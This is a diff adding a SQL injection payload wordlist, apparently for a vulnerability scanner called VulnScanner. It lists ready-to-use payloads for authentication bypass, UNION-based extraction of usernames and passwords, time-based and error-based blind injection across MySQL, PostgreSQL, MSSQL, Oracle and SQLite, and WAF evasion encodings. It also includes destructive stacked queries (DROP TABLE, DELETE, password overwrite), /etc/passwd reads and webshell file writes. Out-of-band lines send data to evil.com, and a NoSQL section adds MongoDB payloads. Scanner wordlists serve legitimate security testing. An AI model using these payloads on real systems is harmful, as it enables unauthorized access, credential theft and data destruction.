@@ -1,0 +1,477 @@
+# SQL Injection Payloads Wordlist
+# VulnScanner - SQLi Detection
+# Categories: Error-based, Boolean, Time-based, Union, WAF Bypass
+
+# ===== BASIC ERROR-BASED =====
+'
+''
+"
+""
+`
+``
+;
+'--
+"--
+)
+')
+")
+';
+";
+`;
+);
+');
+");
+\
+\\
+%27
+%22
+%23
+%2D%2D
+
+# ===== OR-BASED =====
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR "1"="1
+" OR "1"="1"--
+" OR "1"="1"#
+" OR "1"="1"/*
+" OR 1=1--
+" OR 1=1#
+" OR 1=1/*
+OR 1=1
+OR 1=1--
+OR 1=1#
+OR 1=1/*
+' OR 'x'='x
+' OR 'a'='a
+' OR ''='
+" OR ""="
+') OR ('1'='1
+") OR ("1"="1
+')) OR (('1'='1
+")) OR (("1"="1
+
+# ===== AND-BASED =====
+' AND '1'='1
+' AND '1'='1'--
+' AND '1'='1'#
+' AND '1'='2
+' AND '1'='2'--
+' AND '1'='2'#
+' AND 1=1--
+' AND 1=1#
+' AND 1=2--
+' AND 1=2#
+" AND "1"="1
+" AND "1"="1"--
+" AND "1"="2
+" AND "1"="2"--
+AND 1=1
+AND 1=1--
+AND 1=2
+AND 1=2--
+
+# ===== AUTHENTICATION BYPASS =====
+admin'--
+admin'#
+admin'/*
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR '1'='1'#
+admin' OR '1'='1'/*
+admin') OR ('1'='1
+admin') OR ('1'='1'--
+admin" OR "1"="1
+admin" OR "1"="1"--
+' OR 'x'='x'--
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1#
+'-'
+' '
+'&'
+'^'
+'*'
+' OR ''-'
+' OR '' '
+' OR ''&'
+' OR ''^'
+' OR ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" OR ""-"
+" OR "" "
+" OR ""&"
+" OR ""^"
+" OR ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+
+# ===== ORDER BY (Column Count Detection) =====
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY 3--
+ORDER BY 4--
+ORDER BY 5--
+ORDER BY 6--
+ORDER BY 7--
+ORDER BY 8--
+ORDER BY 9--
+ORDER BY 10--
+ORDER BY 11--
+ORDER BY 12--
+ORDER BY 13--
+ORDER BY 14--
+ORDER BY 15--
+ORDER BY 16--
+ORDER BY 17--
+ORDER BY 18--
+ORDER BY 19--
+ORDER BY 20--
+ORDER BY 21--
+ORDER BY 22--
+ORDER BY 23--
+ORDER BY 24--
+ORDER BY 25--
+ORDER BY 50--
+ORDER BY 100--
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 10--
+' ORDER BY 100--
+" ORDER BY 1--
+" ORDER BY 2--
+" ORDER BY 3--
+" ORDER BY 10--
+
+# ===== UNION SELECT =====
+UNION SELECT NULL--
+UNION SELECT NULL,NULL--
+UNION SELECT NULL,NULL,NULL--
+UNION SELECT NULL,NULL,NULL,NULL--
+UNION SELECT NULL,NULL,NULL,NULL,NULL--
+UNION ALL SELECT NULL--
+UNION ALL SELECT NULL,NULL--
+UNION ALL SELECT NULL,NULL,NULL--
+UNION ALL SELECT NULL,NULL,NULL,NULL--
+UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--
+" UNION SELECT NULL--
+" UNION SELECT NULL,NULL--
+" UNION SELECT NULL,NULL,NULL--
+') UNION SELECT NULL--
+') UNION SELECT NULL,NULL--
+') UNION SELECT NULL,NULL,NULL--
+")) UNION SELECT NULL--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+
+# ===== UNION SELECT DATA EXTRACTION =====
+' UNION SELECT username,password FROM users--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT @@version,NULL--
+' UNION SELECT version(),NULL--
+' UNION SELECT user(),NULL--
+' UNION SELECT current_user(),NULL--
+' UNION SELECT database(),NULL--
+' UNION SELECT schema_name FROM information_schema.schemata--
+
+# ===== TIME-BASED BLIND (MySQL) =====
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+" AND SLEEP(5)--
+" OR SLEEP(5)--
+1' AND SLEEP(5)--
+1' AND SLEEP(5)#
+') AND SLEEP(5)--
+')) AND SLEEP(5)--
+1 AND SLEEP(5)--
+1 AND SLEEP(5)
+' AND (SELECT SLEEP(5))--
+" AND (SELECT SLEEP(5))--
+' AND (SELECT * FROM (SELECT SLEEP(5))a)--
+SLEEP(5)--
+SLEEP(5)#
+'; SLEEP(5)--
+'; SLEEP(5)#
+' AND BENCHMARK(5000000,SHA1('test'))--
+' OR BENCHMARK(5000000,SHA1('test'))--
+
+# ===== TIME-BASED BLIND (PostgreSQL) =====
+'; SELECT pg_sleep(5)--
+' AND pg_sleep(5)--
+' OR pg_sleep(5)--
+"; SELECT pg_sleep(5)--
+" AND pg_sleep(5)--
+1; SELECT pg_sleep(5)--
+') AND pg_sleep(5)--
+1 AND (SELECT pg_sleep(5))--
+' AND (SELECT pg_sleep(5))--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+# ===== TIME-BASED BLIND (MSSQL) =====
+'; WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+" WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'
+' WAITFOR DELAY '0:0:5'
+1; WAITFOR DELAY '0:0:5'--
+') WAITFOR DELAY '0:0:5'--
+1 AND WAITFOR DELAY '0:0:5'--
+' AND WAITFOR DELAY '0:0:5'--
+"; WAITFOR DELAY '0:0:5'--
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+
+# ===== TIME-BASED BLIND (Oracle) =====
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+" AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND UTL_INADDR.GET_HOST_ADDRESS('10.0.0.1')--
+
+# ===== TIME-BASED BLIND (SQLite) =====
+' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--
+' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--
+" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--
+
+# ===== ERROR-BASED EXTRACTION (MySQL) =====
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--
+' AND EXP(~(SELECT * FROM (SELECT version())a))--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1)--
+
+# ===== ERROR-BASED EXTRACTION (MSSQL) =====
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CONVERT(int,(SELECT DB_NAME()))--
+' AND 1=CONVERT(int,(SELECT USER))--
+' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--
+
+# ===== ERROR-BASED EXTRACTION (PostgreSQL) =====
+' AND 1=CAST((SELECT version()) AS int)--
+' AND 1=CAST((SELECT current_user) AS int)--
+' AND 1=CAST((SELECT current_database()) AS int)--
+' AND 1=1/(SELECT 0 FROM generate_series(1,1000000))--
+
+# ===== ERROR-BASED EXTRACTION (Oracle) =====
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
+
+# ===== STACKED QUERIES =====
+'; DROP TABLE users--
+'; DROP TABLE users#
+'; SELECT * FROM users--
+'; INSERT INTO users VALUES('hacker','hacked')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; DELETE FROM users--
+'; CREATE TABLE hacked(data varchar(100))--
+"; DROP TABLE users--
+"; SELECT * FROM users--
+1; DROP TABLE users--
+1; SELECT * FROM users--
+
+# ===== COMMENT INJECTION =====
+'--
+"--
+'#
+"#
+'/*
+"/*
+--
+#
+/*
+/*/
+;--
+;#
+'--+-
+"--+-
+'--;
+"--;
+' --
+" --
+'-- -
+"-- -
+'-/*
+"-/*
+'/**/'
+"/**/"
+
+# ===== NULL BYTE INJECTION =====
+%00' OR '1'='1
+%00" OR "1"="1
+'%00
+"%00
+%00'--
+%00"--
+
+# ===== WAF BYPASS - CASE MANIPULATION =====
+' oR '1'='1
+' Or '1'='1
+' OR '1'='1
+' or '1'='1
+' oR '1'='1
+" oR "1"="1
+" Or "1"="1
+" OR "1"="1
+sElEcT
+SeLeCt
+sELECT
+SELECT
+UnIoN
+uNiOn
+UNION
+
+# ===== WAF BYPASS - COMMENT OBFUSCATION =====
+'/**/OR/**/1=1--
+'/**/OR/**/1=1#
+'/**/OR/**/'1'='1
+"/**/OR/**/1=1--
+"/**/OR/**/"1"="1
+UN/**/ION/**/SE/**/LECT/**/1,2,3--
+UNI/**/ON/**/SEL/**/ECT/**/NULL--
+/*!UNION*//*!SELECT*/1,2,3--
+/*!50000UNION*//*!50000SELECT*/1,2,3--
+
+# ===== WAF BYPASS - URL ENCODING =====
+%27%20OR%20%271%27%3D%271
+%27%20OR%20%271%27%3D%271%27--
+%22%20OR%20%221%22%3D%221
+%27%20UNION%20SELECT%20NULL--
+%27%20AND%20SLEEP(5)--
+
+# ===== WAF BYPASS - DOUBLE ENCODING =====
+%2527%2520OR%2520%25271%2527%253D%25271
+%252527%252520OR%252520%2525271%2525273D%25252527
+
+# ===== WAF BYPASS - HEX ENCODING =====
+' OR 0x31=0x31--
+' OR 0x50=0x50--
+' UNION SELECT 0x61646D696E,0x70617373776F7264--
+
+# ===== WAF BYPASS - CHAR/CONCAT =====
+' OR CHAR(49)=CHAR(49)--
+' OR CONCAT(0x27,0x31,0x27)=CONCAT(0x27,0x31,0x27)--
+' UNION SELECT CHAR(97,100,109,105,110)--
+
+# ===== WAF BYPASS - WHITESPACE ALTERNATIVES =====
+'%09OR%091=1--
+'%0AOR%0A1=1--
+'%0BOR%0B1=1--
+'%0COR%0C1=1--
+'%0DOR%0D1=1--
+'%A0OR%A01=1--
+'\tOR\t1=1--
+'\nOR\n1=1--
+'\rOR\r1=1--
+'+OR+1=1--
+
+# ===== WAF BYPASS - PARENTHESIS =====
+'OR(1=1)--
+'OR(1)=(1)--
+'AND(1=1)AND'1'='1
+'||(1=1)--
+'&&(1=1)--
+
+# ===== WAF BYPASS - LOGIC ALTERNATIVES =====
+' || '1'='1
+' && '1'='1
+' XOR '1'='1
+' DIV 1=1--
+' MOD 1=1--
+
+# ===== SPECIFIC DATABASE DETECTION =====
+# MySQL
+' AND @@version--
+' AND version()--
+' AND CONNECTION_ID()--
+
+# PostgreSQL
+' AND version()--
+' AND current_database()--
+
+# MSSQL
+' AND @@version--
+' AND DB_NAME()--
+' AND HOST_NAME()--
+
+# Oracle
+' AND banner FROM v$version--
+' AND SYS_CONTEXT('USERENV','DB_NAME')--
+
+# SQLite
+' AND sqlite_version()--
+
+# ===== FILE OPERATIONS (MySQL) =====
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' UNION SELECT LOAD_FILE(0x2F6574632F706173737764)--
+' INTO OUTFILE '/tmp/shell.php'--
+' INTO DUMPFILE '/tmp/shell.php'--
+
+# ===== CONDITIONAL PAYLOADS =====
+' AND IF(1=1,1,0)--
+' AND IF(1=2,1,0)--
+' AND (SELECT IF(1=1,1,0))--
+' AND (CASE WHEN (1=1) THEN 1 ELSE 0 END)--
+' AND (CASE WHEN (1=2) THEN 1 ELSE 0 END)--
+
+# ===== OUT-OF-BAND (OOB) =====
+'; SELECT LOAD_FILE(CONCAT('\\\\',version(),'.evil.com\\a'))--
+'; SELECT * INTO OUTFILE '\\\\evil.com\\a'--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+
+# ===== SECOND ORDER =====
+admin'--
+test'); DROP TABLE users--
+' AND '1'='1' INTO OUTFILE '/tmp/test.txt'--
+
+# ===== NOSQL INJECTION (MongoDB) =====
+' || '1'=='1
+{"$gt":""}
+{"$ne":""}
+{"$regex":".*"}
+{"$where":"this.password.length > 0"}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":"admin","password":{"$ne":""}}
+{"username":{"$in":["admin"]},"password":{"$gt":""}}
+'; return this.password; var dummy='
+'; return this.a]]; var dummy='
